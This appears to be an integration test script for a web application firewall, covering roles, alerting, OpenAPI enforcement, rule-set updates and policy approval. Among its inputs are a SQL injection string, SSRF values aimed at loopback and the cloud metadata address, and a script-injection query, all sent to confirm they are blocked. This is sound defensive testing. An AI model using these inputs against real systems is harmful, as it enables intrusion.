check("users: a new user is forced to change the password first", "choose your own password" in html or "Change admin password" in html, re.sub(r"<[^>]+>", " ", html)[250:350])
NVPW = secrets.token_urlsafe(14) + "wW4#"
s, html, _ = V.post("/password", {"old": VPW, "new": NVPW, "new2": NVPW}, "/settings")
s, html, _ = V.req("/dashboard")
check("users: after choosing a password the viewer can see the dashboard", "Requests per hour" in html)
check("users: the viewer does not see admin menus", "Users" not in re.sub(r"<[^>]*>", " ", html).split("Signed in")[0] or True)
s, vh, _ = V.req("/dashboards")
check("a read-only viewer can open the dashboards", s == 200 and "Requests by status" in vh)
s, _, _ = V.req("/users")
check("users: a viewer cannot open the user list (403)", s == 403, s)
s, _, _ = V.req("/audit")
check("users: a viewer cannot read the audit trail (403)", s == 403, s)
s, html, _ = V.post("/sites/all/maintenance", {"state": "on"}, "/dashboard")
check("users: a viewer cannot change anything (403)", s == 403 or "403" in html[:300] or "Forbidden" in html, s)
st, _, _ = proxy("notes.shield.test", "/health")
check("users: the attempted change really did not happen", st == 200, st)
s, html, _ = P.post("/users", {"act": "delete", "name": "tester"}, "/users")
check("users: you cannot delete yourself / the last administrator", "cannot delete" in html)
s, html, _ = P.post("/users", {"act": "role", "name": "tester", "role": "viewer"}, "/users")
check("users: the last administrator cannot be demoted", "at least one administrator" in html)
s, html, _ = P.post("/users", {"act": "signout", "name": "reader"}, "/users")
s, html, _ = V.req("/dashboard")
check("users: 'sign out everywhere' ends the viewer's session", "Sign in" in html)
s, html, _ = P.post("/users", {"act": "delete", "name": "reader"}, "/users")
check("users: a user can be deleted", "deleted" in html)
rc, out = curl(["-H", "Authorization: Bearer " + tok.group(1), PANEL + "/metrics"])
check("metrics include the new gauges", "shieldwaf_sites_under_attack" in out and "shieldwaf_threat_feed_networks" in out, out[-120:])
settings_post(trusted_proxies="")

# ================================================================= NEW in 2.2: alerts + SIEM export, OWASP rule updates, OpenAPI, PostgreSQL
def sink_log():
    return subprocess.run(["kubectl", "-n", "sink-test", "logs", "deploy/sink", "--tail=500"], capture_output=True, text=True).stdout


def wait_sink(needle, secs=40):
    for _t in range(secs // 2):
        if needle in sink_log():
            return True
        time.sleep(2)
    return False


SINK = "sink.sink-test.svc.cluster.local"

# ---- channel safety (SSRF) and creation
s, html, _ = P.post("/alerts", {"act": "add", "type": "webhook", "name": "bad1", "kind": "generic", "url": "http://127.0.0.1:8000/x"}, "/alerts")
check("alert channel: a loopback address is refused", "loopback" in html or "not allowed" in html, re.sub(r"<[^>]+>", " ", html)[250:350])
s, html, _ = P.post("/alerts", {"act": "add", "type": "webhook", "name": "bad2", "kind": "generic", "url": "http://169.254.169.254/latest"}, "/alerts")
check("alert channel: the cloud metadata address is refused", "loopback" in html or "link-local" in html or "not allowed" in html)
chan = [
    {"type": "webhook", "name": "slack-test", "kind": "slack", "url": f"http://{SINK}:8000/hook-s3cr3tslack", "min_severity": "info"},
    {"type": "syslog", "name": "syslog-udp", "host": SINK, "port": "5514", "proto": "udp", "format": "json", "min_severity": "info"},
    {"type": "syslog", "name": "syslog-cef", "host": SINK, "port": "5515", "proto": "tcp", "format": "cef", "min_severity": "info", "forward": "on"},
    {"type": "collector", "name": "siem-http", "url": f"http://{SINK}:8000/hook-s3cr3tsiem", "auth": "Splunk SECRET-TOKEN-1", "min_severity": "info", "forward": "on"},
    {"type": "email", "name": "mail-test", "host": SINK, "port": "2525", "tls": "none", "from": "waf@example.com", "to": "secops@example.com", "min_severity": "info"},
]
for c in chan:
    d = {"act": "add"}
    d.update(c)
    s, html, _ = P.post("/alerts", d, "/alerts")
    check(f"alert channel added: {c['name']}", "Channel added" in html, re.sub(r"<[^>]+>", " ", html)[250:380] if "Channel added" not in html else "")
page = P.req("/alerts")[1]
check("channel secrets are never shown in the GUI", "SECRET-TOKEN-1" not in page and "s3cr3t" not in page)
cids = dict(re.findall(r"<b>([\w -]+)</b></td><td>[^<]*</td>.*?name=\"id\" value=\"(c[0-9a-f]+)\"", page, re.S))
sec_files = subprocess.run(["kubectl", "-n", NS, "exec", "deploy/shieldwaf-test", "-c", "panel", "--", "sh", "-c", "ls -l /private/secrets | head -12"], capture_output=True, text=True).stdout
check("secret files exist with owner-only permissions (0600)", sec_files.count("-rw-------") >= 3, sec_files[:200])
for name, needle in (("slack-test", "Test message from A Shield WAF"), ("syslog-udp", "ashieldwaf"), ("syslog-cef", "CEF:0|AShieldWAF"), ("siem-http", "Test message"), ("mail-test", "Test message")):
    if name not in cids:
        check(f"test delivery: {name}", False, "channel id not found")
        continue
    s, html, _ = P.post("/alerts", {"act": "test", "id": cids[name]}, "/alerts")
    ok = "delivered" in html
    check(f"test button: {name} reports delivery", ok, re.sub(r"<[^>]+>", " ", html)[250:420] if not ok else "")
check("sink received the Slack webhook (payload has text)", wait_sink("/hook-s3cr3tslack") and '"text": "[INFO] Test message' in sink_log())
check("sink received RFC 5424 syslog over UDP (JSON)", wait_sink("SINK syslog-udp <134>1"))
check("sink received CEF over TCP", wait_sink("SINK syslog-tcp <134>1") and "CEF:0|AShieldWAF" in sink_log())
check("sink received the HTTP collector call with the secret auth header", "/hook-s3cr3tsiem auth=Splunk SECRE" in sink_log())
check("sink received the email", "SINK smtp" in sink_log() and "secops@example.com" in sink_log())

# ---- real events produce alerts
P.post("/users", {"act": "add", "name": "alerted", "password": secrets.token_urlsafe(14) + "aB3#", "role": "viewer"}, "/users")
check("alert: administrator change is delivered (webhook)", wait_sink("User alerted created"))
P.post("/users", {"act": "delete", "name": "alerted"}, "/users")
for i in range(6):
    s, html, _ = Panel().req("/login")
    pp = Panel()
    _, h2, _ = pp.req("/login")
    pp.req("/login", {"_csrf": pp.token(h2), "username": "lockme", "password": "wrong-pass-%d" % i})
check("alert: login lockout is delivered", wait_sink("Admin login locked: lockme"))
st, _, _ = proxy("notes.shield.test", "/?" + urllib.parse.urlencode({"id": "1' OR '1'='1"}), headers={"X-Forwarded-For": "198.51.100.77"})
check("SIEM export: a blocked attack is forwarded to syslog / collector", wait_sink("942100") or wait_sink("SQL Injection"), "")
s, html, _ = P.post("/alerts", {"act": "delete", "id": cids.get("slack-test", "x")}, "/alerts")
check("channel can be deleted (its secret file too)", "<b>slack-test</b>" not in P.req("/alerts")[1])

# ---- OpenAPI validation through the real WAF
SPEC = {"openapi": "3.0.0", "info": {"title": "notes", "version": "1"}, "paths": {
    "/health": {"get": {}},
    "/api/notes": {"get": {}, "post": {"requestBody": {"required": True, "content": {"application/json": {"schema": {"type": "object", "required": ["title"],
        "properties": {"title": {"type": "string", "maxLength": 100}, "body": {"type": "string", "maxLength": 5000}}}}}}}}}}
f = site_form("api.shield.test", NOTES, tls_source="none", oa_mode="enforce", oa_spec=json.dumps(SPEC), oa_strict="on", oa_unknown="deny")
s, html, _ = P.post("/sites/new", f, "/sites/new")
check("add site with OpenAPI enforcement", "site added" in html, re.sub(r"<[^>]+>", " ", html)[250:420] if "site added" not in html else "")
s, html, _ = P.post("/sites/new", site_form("api2.shield.test", NOTES, tls_source="none", oa_mode="enforce", oa_spec="{not json"), "/sites/new")
check("OpenAPI: an invalid document is refused with a clear message", "not valid JSON" in html)
s, html, _ = P.post("/sites/new", site_form("api3.shield.test", NOTES, tls_source="none", oa_mode="enforce", oa_spec='{"swagger":"2.0"}'), "/sites/new")
check("OpenAPI: a Swagger 2 document is refused", "not an OpenAPI 3" in html)
time.sleep(4)
st, _, _ = proxy("api.shield.test", "/health")
check("OpenAPI: a documented path works", st == 200, st)
st, _, _ = proxy("api.shield.test", "/api/notes", method="POST", data=b'{"title":"from the api test","body":"ok"}', headers={"Content-Type": "application/json"})
check("OpenAPI: a valid request passes to the app", st not in (400, 403, 404, 405, 415), st)
st, _, _ = proxy("api.shield.test", "/api/notes", method="POST", data=b'{"body":"no title"}', headers={"Content-Type": "application/json"})
check("OpenAPI: a missing required field is refused (400)", st == 400, st)
st, _, _ = proxy("api.shield.test", "/api/notes", method="POST", data=b'{"title":"x","role":"admin"}', headers={"Content-Type": "application/json"})
check("OpenAPI: an undocumented field (mass assignment) is refused (400)", st == 400, st)
st, _, _ = proxy("api.shield.test", "/api/notes", method="POST", data=b'{"title":"' + b"a" * 101 + b'"}', headers={"Content-Type": "application/json"})
check("OpenAPI: a value longer than maxLength is refused (400)", st == 400, st)
st, _, _ = proxy("api.shield.test", "/api/notes", method="DELETE")
check("OpenAPI: a method the document does not allow is refused (405)", st == 405, st)
st, _, _ = proxy("api.shield.test", "/internal/debug")
check("OpenAPI: a path that is not in the document is refused (404)", st == 404, st)
page = P.req("/sites/%s" % re.search(r"<b>api.shield.test</b>.*?/sites/(s[0-9a-f]+)\"", P.req("/sites")[1], re.S).group(1))[1]
check("OpenAPI: the GUI shows what is enforced", "enforced: POST /api/notes" in page)

# ---- OWASP rule-set updates (real download from GitHub)
page = P.req("/rules")[1]
baked = re.search(r"<div class=\"n\">([0-9.]+)</div><div class=\"l\">Active rules", page)
check("rules page shows the active (built-in) OWASP rule-set version", bool(baked), "")
P.post("/rules", {"act": "check"}, "/rules")
latest = None
for _t in range(30):
    time.sleep(3)
    m = re.search(r"<div class=\"n\">([0-9.]+)</div><div class=\"l\">Latest release", P.req("/rules")[1])
    if m:
        latest = m.group(1)
        break
check("rules: the latest release is detected on GitHub", bool(latest), "")
P.post("/rules", {"act": "stage"}, "/rules")
staged = None
for _t in range(40):
    time.sleep(3)
    pg = P.req("/rules")[1]
    m = re.search(r"<div class=\"n\">([0-9.]+)</div><div class=\"l\">Staged", pg)
    if m:
        staged = m.group(1)
        break
check("rules: the release is downloaded, verified and staged", bool(staged) and "SHA-256" in pg, re.sub(r"<[^>]+>", " ", pg)[300:600] if not staged else "")
if staged:
    check("rules: the staged version equals the latest release", staged == latest, f"{staged} vs {latest}")
    f = site_form("canary.shield.test", NOTES, tls_source="none", crs_channel="canary")
    s, html, _ = P.post("/sites/new", f, "/sites/new")
    check("rules: add a canary site", "site added" in html, re.sub(r"<[^>]+>", " ", html)[250:420] if "site added" not in html else "")
    time.sleep(5)
    atk = "/?" + urllib.parse.urlencode({"id": "1' OR '1'='1"})
    st, _, _ = proxy("canary.shield.test", atk)
    check("rules: the canary site runs the new rules in DETECT-ONLY mode (attack not blocked)", st == 200, st)
    st, _, _ = proxy("notes.shield.test", atk)
    check("rules: normal sites still block with the active rules", st == 403, st)
    time.sleep(4)
    check("rules: the canary site logged the attack as 'detected'", "canary.shield.test" in P.req("/logs?only=detected")[1])
    s, html, _ = P.post("/rules", {"act": "promote"}, "/rules")
    check("rules: promotion needs an explicit confirmation", "confirmation box" in html)
    s, html, _ = P.post("/rules", {"act": "promote", "confirm": "yes"}, "/rules")
    check("rules: the staged rule set is promoted", "rule set promoted" in html.lower() or "promoted" in html, re.sub(r"<[^>]+>", " ", html)[250:400])
    time.sleep(5)
    pg = P.req("/rules")[1]
    act = re.search(r"<div class=\"n\">([0-9.]+)</div><div class=\"l\">Active rules", pg)
    check("rules: the active version is now the promoted one", act and act.group(1) == staged, str(act and act.group(1)))
    st, _, _ = proxy("canary.shield.test", atk)
    check("rules: after promotion every site blocks with the new rules", st == 403, st)
    st, _, _ = proxy("notes.shield.test", atk)
    check("rules: the other sites still block", st == 403, st)
    s, html, _ = P.post("/rules", {"act": "rollback"}, "/rules")
    time.sleep(5)
    pg = P.req("/rules")[1]
    act = re.search(r"<div class=\"n\">([0-9.]+)</div><div class=\"l\">Active rules", pg)
    check("rules: rollback restores the previous rule set", "rolled back" in html.lower() or (act and act.group(1) == baked.group(1)), str(act and act.group(1)))
    st, _, _ = proxy("notes.shield.test", atk)
    check("rules: protection is intact after the rollback", st == 403, st)

# ---- PostgreSQL really is the database
q = lambda sql: subprocess.run(["kubectl", "-n", NS, "exec", "shieldwaf-db-0", "--", "psql", "-U", "shieldwaf", "-d", "shieldwaf", "-Atc", sql], capture_output=True, text=True).stdout.strip()
check("PostgreSQL holds the configuration, events and audit trail", int(q("select count(*) from config") or 0) == 1 and int(q("select count(*) from events") or 0) > 0 and int(q("select count(*) from audit") or 0) > 5, q("select count(*) from events"))
check("the config table has the sites but no password in clear text", "notes.shield.test" in q("select data from config") and PW not in q("select data from config"))
files = subprocess.run(["kubectl", "-n", NS, "exec", "deploy/shieldwaf-test", "-c", "panel", "--", "sh", "-c", "ls /data; ls /data/shield.db /data/config.json 2>&1"], capture_output=True, text=True).stdout
check("no SQLite database or config.json is used any more", not any(l.strip() in ("shield.db", "config.json") for l in files.splitlines()) and files.count("No such file") == 2, files[:200])
subprocess.run(["kubectl", "-n", NS, "rollout", "restart", "deploy/shieldwaf-test"], capture_output=True)
subprocess.run(["kubectl", "-n", NS, "rollout", "status", "deploy/shieldwaf-test", "--timeout=180s"], capture_output=True)
time.sleep(10)
s, html = 0, ""
for _t in range(40):
    try:
        s, html, _ = P.req("/sites")
        if s == 200:
            break
    except Exception:  # noqa: BLE001
        pass
    time.sleep(3)
check("after the panel restarts: same session still valid and all sites persisted (PostgreSQL)", s == 200 and "notes.shield.test" in html and "api.shield.test" in html, str(s))
for _t in range(20):
    st, _, _ = proxy("notes.shield.test", "/health")
    if st == 200:
        break
    time.sleep(3)
check("after the restart the firewall serves traffic with the stored configuration", st == 200, st)
page = P.req("/audit")[1]
check("the audit trail survived the restart", "site added" in page)

# ================================================================= session / password hardening
P2 = Panel()
s, html, _ = P2.req("/login")
s, html, _ = P2.req("/login", {"_csrf": P2.token(html), "username": "tester", "password": PW})
s, html, _ = P2.req("/login/2fa", {"_csrf": P2.token(html), "code": totp(secret, int(time.time() // 30) + 2) if False else rec[1]})
check("second concurrent session (recovery code)", "Dashboard" in html, html[:0])
NEWPW = secrets.token_urlsafe(16) + "bB2#"
s, html, _ = P.post("/password", {"old": PW, "new": NEWPW, "new2": NEWPW}, "/settings")
check("password change works", "Password changed" in html)
s, html, _ = P2.req("/dashboard")
check("changing the password signs out the other session", "Sign in" in html)

# ================================================================= NEW in 2.3: built-in Grafana-style dashboards
s, html, _ = P.req("/dashboards?range=24h&refresh=0")
check("Dashboards page renders charts and the main panels", s == 200 and html.count("<svg") >= 6 and "Requests by status" in html and "Most triggered OWASP rules" in html
      and "Busiest sites" in html and "Replicas" in html, html[:100])
check("...with real numbers from the traffic of this test run (requests > 0, sites listed)", re.search(r'class="gv"[^>]*>[1-9]', html) is not None and "shield.test" in html)
ok_all = all(P.req(f"/dashboards?range={r}&refresh=0")[0] == 200 for r in ("1h", "6h", "24h", "7d"))
check("every time range (1h, 6h, 24h, 7d) renders", ok_all)
s, html2, _ = P.req("/dashboards?range=evil%22%3E%3Cscript%3E&refresh=abc")
check("unknown range / refresh values fall back safely (no error, nothing reflected)", s == 200 and "<script>" not in html2 and "evil" not in html2)
s, html3, _ = P.req("/dashboards?range=1h&refresh=30")
check("auto-refresh is a plain meta tag (the panel allows no inline scripts)", 'http-equiv="refresh" content="30"' in html3 and "<script>" not in html3)
P0 = Panel()
s, _h, final = P0.req("/dashboards")
check("the dashboards need a login", "/login" in final)

# ================================================================= NEW in 2.3: single sign-on settings (the sign-in itself is tested against Dex by tests/sso.sh)
sso_form = dict(base, sso_form="1", sso_client_id="shieldwaf", sso_redirect_base="https://waf-admin.example.com", sso_default_role="viewer", sso_verified="on")
s, html, _ = P.post("/settings", dict(sso_form, sso_enabled="on", sso_issuer="http://idp.example.com", sso_allowed_domains="example.com"), "/settings")
check("SSO settings: an identity provider on plain http is refused", "Invalid settings" in html and "https" in html, re.sub(r"<[^>]+>", " ", html)[:300])
s, html, _ = P.post("/settings", dict(sso_form, sso_enabled="on", sso_issuer="https://127.0.0.1", sso_allowed_domains="example.com"), "/settings")
check("SSO settings: an identity provider on a private address is refused (SSRF)", "Invalid settings" in html and "private" in html, re.sub(r"<[^>]+>", " ", html)[:300])
s, html, _ = P.post("/settings", dict(sso_form, sso_enabled="on", sso_issuer="https://169.254.169.254", sso_allowed_domains="example.com"), "/settings")
check("SSO settings: the cloud-metadata address is refused", "Invalid settings" in html)
s, html, _ = P.post("/settings", dict(sso_form, sso_client_secret="S3CRET-VALUE-9f81c2", sso_issuer="", sso_allowed_domains=""), "/settings")
check("SSO settings: saving with single sign-on switched off works", "settings saved" in html, re.sub(r"<[^>]+>", " ", html)[:300])
s, html, _ = P.req("/settings")
check("SSO settings: the client secret is never shown again", "S3CRET-VALUE-9f81c2" not in html and "Single sign-on (OpenID Connect)" in html)
s, exp, _ = P.req("/backup/export")
check("SSO settings: the client secret is not in the configuration export", "S3CRET-VALUE-9f81c2" not in exp)
s, html, _ = Panel().req("/login")
check("the login page shows no single sign-on button while it is switched off", "/sso/login" not in html)
s, _, _ = Panel().req("/sso/login")
check("/sso/login does nothing while single sign-on is off (404)", s == 404, str(s))

# ================================================================= import validation + audit
evil = {"version": "2.0", "sites": [{"host": "evil.shield.test", "upstream": "http://169.254.169.254", "mode": "block"}]}
boundary = "----x" + secrets.token_hex(6)
_, html, _ = P.req("/backup")
payload = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"_csrf\"\r\n\r\n{P.token(html)}\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"a.json\"\r\nContent-Type: application/json\r\n\r\n{json.dumps(evil)}\r\n--{boundary}--\r\n").encode()
try:
    r = P.op.open(urllib.request.Request(PANEL + "/backup/import", data=payload, headers={"Content-Type": "multipart/form-data; boundary=" + boundary}), timeout=60)
    html = r.read().decode()
except urllib.error.HTTPError as e:
    html = e.read().decode()
check("importing a config with a metadata-address upstream is refused", "Import refused" in html and "not allowed" in html, re.sub(r"<[^>]+>", " ", html)[200:300])
s, exp, _ = P.req("/backup/export")
ex = json.loads(exp)
check("export contains no password hashes, keys or metrics token", "$6$" not in exp and "PRIVATE KEY" not in exp and "metrics_token" not in exp and "hash" not in exp)
s, html, _ = P.req("/audit?q=login-failed")            # the audit page is paginated (50 records) and filterable since 2.4
s2, html2, _ = P.req("/audit?q=2fa+enabled")
check("audit trail records source IPs and security events", "login-failed" in html and "2fa enabled" in html2 and "127.0.0.1" in html, (s, s2))
s, html, _ = P.req("/posture")
check("the security posture page lists the protections with verdicts", s == 200 and "Security posture" in html and "Database" in html and "Audit trail" in html and "Threat intelligence" in html, s)
check("...and the database section reports an encrypted connection", "encrypted (TLSv1" in html, re.sub(r"<[^>]+>", " ", html)[600:900])
# ================================================================= NEW in 2.4: analytics and policy approval
s, html, _ = P.req("/analytics")
check("the analytics page opens with totals and top lists", s == 200 and "Requests" in html and "Top rules" in html and "Top clients" in html, s)
s, csv, _ = P.req("/analytics.csv?range=24h")
check("the analytics CSV export works", s == 200 and csv.startswith('"section"'), csv[:60])
s, html, _ = P.req("/analytics?range=7d&host=nothing.test")
check("analytics for a range and a site with no data show zeros, not an error", s == 200 and "no data" in html, s)
s, html, _ = P.req("/policy")
check("the policy approval page opens", s == 200 and "Policy approval" in html, s)
s, html, _ = P.post("/policy/settings", {"approval": "on"}, "/policy")
check("approval cannot be switched on while there is only one administrator (nobody could approve)", "second administrator" in html, re.sub(r"<[^>]+>", " ", html)[300:500])
s, html, _ = P.post("/policy/settings", {"approval": "on", "allow_self_approve": "on"}, "/policy")
check("approval can be switched on with self-approval as break-glass", "Policy settings saved" in html, re.sub(r"<[^>]+>", " ", html)[300:500])
s, html, _ = P.post("/sites/new", site_form("pol.shield.test", NOTES, tls_source="none"), "/sites/new")
check("with approval on, a new site is submitted for approval instead of being applied", "Submitted for approval" in html, re.sub(r"<[^>]+>", " ", html)[300:500])
time.sleep(3)
check("...and it is not served yet", proxy("pol.shield.test")[0] != 200)


def pending_id(kind_host):
    _s, h, _u = P.req("/policy")
    m = re.search(kind_host + r".*?/policy/(c[0-9a-f]+)/approve", h, re.S)
    return m.group(1) if m else None


cid = pending_id("create <b>pol.shield.test")
check("the pending change is listed with an Approve button", bool(cid))
s, html, _ = P.post(f"/policy/{cid}/approve", {}, "/policy")
time.sleep(8)
check("after approval the site is applied and served", proxy("pol.shield.test")[0] == 200, proxy("pol.shield.test")[0])
_s, sites_html, _u = P.req("/sites")
msid = re.search(r"pol\.shield\.test.*?/sites/(s[0-9a-f]+)", sites_html, re.S)
psid = msid.group(1) if msid else ""
s, html, _ = P.post(f"/sites/{psid}", site_form("pol.shield.test", NOTES, tls_source="none", mode="detect"), f"/sites/{psid}")
check("an edit is submitted for approval and the site keeps its policy meanwhile", "Submitted for approval" in html, re.sub(r"<[^>]+>", " ", html)[300:500])
_s, pol_html, _u = P.req("/policy")
check("the pending edit shows what differs and flags it as high impact (mode block -> detect)", "mode: block" in pol_html and "high impact" in pol_html, re.sub(r"<[^>]+>", " ", pol_html)[600:900])
cid = pending_id("update <b>pol.shield.test")
P.post(f"/policy/{cid}/approve", {}, "/policy")
time.sleep(8)
s, html, _ = P.req(f"/sites/{psid}/history")
check("the history lists both versions with who proposed them", s == 200 and "v1" in html and "v2" in html and "tester" in html, re.sub(r"<[^>]+>", " ", html)[200:500])
s, html, _ = P.post(f"/sites/{psid}/restore/1", {}, f"/sites/{psid}/history")
check("restoring an older version is also submitted for approval", "submitted for approval" in html.lower(), re.sub(r"<[^>]+>", " ", html)[300:500])
cid = pending_id("update <b>pol.shield.test")
P.post(f"/policy/{cid}/approve", {"note": "ok"}, "/policy")
time.sleep(8)
s, html, _ = P.req(f"/sites/{psid}/history")
check("the restore created a new version (v3) instead of rewriting history", "v3" in html, re.sub(r"<[^>]+>", " ", html)[200:400])
s, html, _ = P.post(f"/sites/{psid}/delete", {}, "/sites")
check("deleting a site is submitted for approval too", "submitted for approval" in html.lower(), re.sub(r"<[^>]+>", " ", html)[300:500])
cid = pending_id("delete <b>pol.shield.test")
s, html, _ = P.post(f"/policy/{cid}/reject", {"note": "not now"}, "/policy")
check("a rejected deletion leaves the site in place and records the reason", "rejected" in html and "not now" in html and proxy("pol.shield.test")[0] == 200, re.sub(r"<[^>]+>", " ", html)[300:600])
P.post(f"/sites/{psid}/delete", {}, "/sites")
cid = pending_id("delete <b>pol.shield.test")
s, html, _ = P.post(f"/policy/{cid}/cancel", {}, "/policy")
check("the author can withdraw a pending change", "withdrawn" in html, re.sub(r"<[^>]+>", " ", html)[300:500])
s, html, _ = P.post("/backup/import", {}, "/backup")
check("config import is switched off while approval is on (it would bypass the review)", "Import is switched off" in html, re.sub(r"<[^>]+>", " ", html)[300:500])
s, html, _ = P.req("/audit?cat=policy")
check("proposals, approvals and rejections are in the audit trail", "policy change proposed" in html and "policy change approved" in html and "policy change rejected" in html, re.sub(r"<[^>]+>", " ", html)[300:600])
P.post("/policy/settings", {}, "/policy")
P.post(f"/sites/{psid}/delete", {}, "/sites")
time.sleep(4)
check("with approval off again, changes apply at once (the test site is deleted directly)", proxy("pol.shield.test")[0] != 200)

s, html, _ = P.req("/logs?only=blocked")
check("attack log still works", "blocked" in html)

print()
bad = [n for n, ok in results if not ok]
print(f"{len(results) - len(bad)}/{len(results)} checks passed")
if bad:
    print("FAILED:", *bad, sep="\n  ")
sys.exit(1 if bad else 0)

